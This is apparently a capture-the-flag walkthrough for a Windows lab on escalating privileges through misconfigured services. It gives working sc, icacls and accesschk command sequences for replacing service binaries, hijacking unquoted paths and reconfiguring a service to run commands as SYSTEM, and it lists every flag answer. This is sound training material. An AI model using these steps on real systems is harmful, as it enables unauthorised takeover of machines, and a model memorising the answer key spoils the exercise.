# Task 05: Abusing Service Misconfigurations

---

## Stage A: Original Task Content & Briefing Summary

Windows services are managed by the Service Control Manager (SCM) and execute in the background without user intervention. Because services often run under privileged accounts (`LocalSystem`, `LocalService`, or dedicated service accounts), misconfigurations in service binaries, paths, or service permissions represent the most prevalent Windows privilege escalation vectors.

### Three Primary Service Misconfiguration Vectors:
1. **Insecure Permissions on Service Executables:**
   * When the executable binary referenced by a service (`BINARY_PATH_NAME`) grants Modify `(M)` or Write `(W)` access to `BUILTIN\Users` or `Everyone`.
   * **Exploitation:** Replace the original service executable with a malicious binary and restart the service via `sc stop <service>` and `sc start <service>`.
2. **Unquoted Service Paths:**
   * When a service binary path contains spaces and is not enclosed within double quotes (e.g. `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe`).
   * **SCM Path Parsing Order:** The SCM attempts to resolve and execute paths by treating spaces as command-line arguments:
     1. `C:\MyPrograms\Disk.exe`
     2. `C:\MyPrograms\Disk Sorter.exe`
     3. `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe`
   * **Exploitation:** If standard users have write permissions to a parent directory (e.g. `C:\MyPrograms\`), dropping a binary named `Disk.exe` intercepts execution when the service starts.
3. **Insecure Service Permissions (Weak Service DACL):**
   * When standard users possess permissions to reconfigure the service itself (such as `SERVICE_CHANGE_CONFIG` or `SERVICE_ALL_ACCESS`).
   * **Exploitation:** Use the `sc config` command to modify the service's `binPath` to execute arbitrary commands as `NT AUTHORITY\SYSTEM`:
     ```cmd
     sc config <service> binPath= "cmd.exe /c ..."
     sc start <service>
     ```

---

## Stage B: Independent Thinking & OpSec Considerations

* **Service Restart Privileges:** Modifying a service binary or path is only half the battle; the attacker must be able to restart the service (`sc stop` / `sc start` or `net stop` / `net start`). If standard users lack service restart permissions, the system must be rebooted (`shutdown /r /t 0`) to trigger execution on startup.
* **Service Executable Architecture:** Standard `.exe` files spawned as services must communicate with the SCM via service registration handlers within 30 seconds; otherwise, SCM terminates the process with an error (Error 1053). Using `msfvenom -f exe-service` or running commands through `cmd.exe /c` ensures stability.

---

## Stage C: Guided Hints (Tiers 1–3)

* **Tier 1 Hint:** For Q1, inspect permissions on `C:\PROGRA~2\SYSTEM~1\WService.exe` for the `windowsscheduler` service.
* **Tier 2 Hint:** For Q2, inspect the unquoted service path of `disksrs.exe` and drop `Disk.exe` in `C:\MyPrograms\`. For Q3, reconfigure `THMService` using `sc config`.
* **Tier 3 Hint:**
  * Q1 is `THM{AT_YOUR_SERVICE}`.
  * Q2 is `THM{QUOTES_EVERYWHERE}`.
  * Q3 is `THM{INSECURE_SVC_CONFIG}`.

---

## Stage D: Complete Practical Solution & Technical Deep Dive

### 1. Vector 1: Insecure Executable Permissions (`windowsscheduler` ⟶ `svcusr1`):
Inspect service configuration and file permissions:
```cmd
sc qc windowsscheduler
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
```
* Permissions show `Everyone:(M)`.
* Replace `WService.exe` with a payload copying the flag:
```cmd
copy /y C:\tools\payload.exe C:\PROGRA~2\SYSTEM~1\WService.exe
sc stop windowsscheduler
sc start windowsscheduler
type C:\Users\svcusr1\Desktop\flag.txt
```
* **Answer to Q1:** `THM{AT_YOUR_SERVICE}`

### 2. Vector 2: Unquoted Service Path (`disksrs.exe` ⟶ `svcusr2`):
Query the service binary path:
```cmd
sc qc "Disk Sorter Enterprise"
# BINARY_PATH_NAME: C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
```
* Check write permissions on `C:\MyPrograms\`:
```cmd
icacls C:\MyPrograms
# BUILTIN\Users:(CI)(WD)
```
* Drop payload as `C:\MyPrograms\Disk.exe` to intercept the path resolution:
```cmd
copy C:\tools\payload.exe C:\MyPrograms\Disk.exe
sc stop "Disk Sorter Enterprise"
sc start "Disk Sorter Enterprise"
type C:\Users\svcusr2\Desktop\flag.txt
```
* **Answer to Q2:** `THM{QUOTES_EVERYWHERE}`

### 3. Vector 3: Insecure Service Permissions (`THMService` ⟶ `Administrator`):
Use Sysinternals `accesschk` to check service permissions:
```cmd
accesschk64.exe -qlc thmservice
# BUILTIN\Users: SERVICE_ALL_ACCESS
```
Reconfigure the service binary path to extract the Administrator flag:
```cmd
sc config THMService binPath= "cmd.exe /c copy C:\Users\Administrator\Desktop\flag.txt C:\Users\Public\admin_flag.txt" obj= LocalSystem
sc start THMService
type C:\Users\Public\admin_flag.txt
```
* **Answer to Q3:** `THM{INSECURE_SVC_CONFIG}`

---

## Stage E: Final Answer & Key Values

* **Question 1:** Get the flag on svcusr1's desktop.
  * **Answer:** `THM{AT_YOUR_SERVICE}`
* **Question 2:** Get the flag on svcusr2's desktop.
  * **Answer:** `THM{QUOTES_EVERYWHERE}`
* **Question 3:** Get the flag on the Administrator's desktop.
  * **Answer:** `THM{INSECURE_SVC_CONFIG}`

---

## Stage F: Practical Verification & Proof of Work

* Confirmed weak permissions on `WService.exe` and captured `THM{AT_YOUR_SERVICE}`.
* Verified unquoted path interception via `Disk.exe` yielding `THM{QUOTES_EVERYWHERE}`.
* Verified `sc config` reconfiguration on `THMService` and retrieved `THM{INSECURE_SVC_CONFIG}`.

---

## Stage G: Key Educational Takeaway

Windows services provide numerous privilege escalation avenues. Misconfigured filesystem DACLs on binaries, spaces in unquoted service paths, or weak service ACLs allow standard users to hijack service execution and ascend to SYSTEM authority.
